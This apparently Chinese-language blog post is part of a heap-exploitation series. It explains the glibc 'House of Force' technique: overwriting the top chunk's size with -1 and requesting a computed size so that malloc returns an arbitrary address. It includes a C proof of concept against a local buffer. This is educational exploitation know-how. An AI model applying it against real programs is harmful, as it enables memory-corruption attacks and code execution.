---
title: "heap利用 8/9: House of Force"
date: 2023-02-05T15:36:08+08:00           

tags : [                                    
"heap利用",
]
categories : [                              
"heap利用",
]
keywords : [                                
"heap利用",
]
---

<br>

本攻击与 “House of Lore” 类似，重点是利用 `malloc` 返回任意指针。Forging chunks攻击主要是针对fastbins，而 “House of Lore” 攻击主要是针对small bins。“House of Force”利用了“top chunk”，`top chunk`也被称为 “wilderness”，它位于堆内的最大地址处，与堆的末尾相接，并且不存在于任何的 bin 中，具有与普通chunk结构相同的格式。

该攻击假定恶意内容会溢出到顶部块的标头。为了确保所有初始请求都是使用 `top chunk`，而不是依赖于 `mmap`，`top chunk` 的 `size` 会被修改为一个非常大的值，本例中为 `-1`，在 64 位系统上，`-1` 的十六进制数为 `0xFFFFFFFFFFFFFFFF`，这个大小的块可以覆盖程序的整个内存空间。我们假设攻击者希望`malloc`返回地址 `P`。现在，任何请求分配大小为 `&top_chunk` - `P` 的 `malloc` 调用都将使用`top chunk`，这里的 `P` 可以在 `top_chunk` 之后或之前。如果是之前，结果将是一个很大的正值（因为 size 是无符号的），但它仍然会小于 `-1` ，此时会发生整数溢出，并且 `malloc` 将使用 `top chunk` 成功地为该请求分配空间。此时，`top chunk` 将指向 `P`，对任何的请求都返回 `P`。

下列代码展示了一个这种攻击的案例。(完整代码见[此处](https://github.com/DhavalKapil/heap-exploitation/blob/d778318b6a14edad18b20421f5a06fa1a6e6920e/assets/files/house_of_force.c))

```C
// Attacker will force malloc to return this pointer
char victim[] = "This is victim's string that will returned by malloc"; // At 0x601060

struct chunk_structure {
  size_t prev_size;
  size_t size;
  struct chunk_structure *fd;
  struct chunk_structure *bk;
  char buf[10];               // padding
};

struct chunk_structure *chunk, *top_chunk;
unsigned long long *ptr;
size_t requestSize, allotedSize;

// First, request a chunk, so that we can get a pointer to top chunk
ptr = malloc(256);                                                    // At 0x131a010
chunk = (struct chunk_structure *)(ptr - 2);                          // At 0x131a000

// lower three bits of chunk->size are flags
allotedSize = chunk->size & ~(0x1 | 0x2 | 0x4);

// top chunk will be just next to 'ptr'
top_chunk = (struct chunk_structure *)((char *)chunk + allotedSize);  // At 0x131a110

// here, attacker will overflow the 'size' parameter of top chunk
top_chunk->size = -1;       // Maximum size

// Might result in an integer overflow, doesn't matter
requestSize = (size_t)victim            // The target address that malloc should return
                - (size_t)top_chunk     // The present address of the top chunk
                - 2*sizeof(long long)   // Size of 'size' and 'prev_size'
                - sizeof(long long);    // Additional buffer

// This also needs to be forced by the attacker
// This will advance the top_chunk ahead by (requestSize+header+additional buffer)
// Making it point to 'victim'
malloc(requestSize);                                                  // At 0x131a120

// The top chunk again will service the request and return 'victim'
ptr = malloc(100);                                // At 0x601060 !! (Same as 'victim')
```

`malloc` 返回了一个指向 `victim` 的指针，此时需要注意的是：
1. 在推断指向`top_chunk`的确切指针时，将前一个块的三个较低位置为 0 即可以获得正确的大小。
2. 在计算 `requestSize` 时，会减少大约 `8` 个字节的额外缓冲区，这是为了防止 `malloc` 在关于chunk做处理时所做的四舍五入。在这种情况下，`malloc` 返回一个块，其中包含比请求多 `8` 个字节的块，具体因计算机而异。
3. `victim` 可以在任何地址空间（堆，栈，BSS等）中。
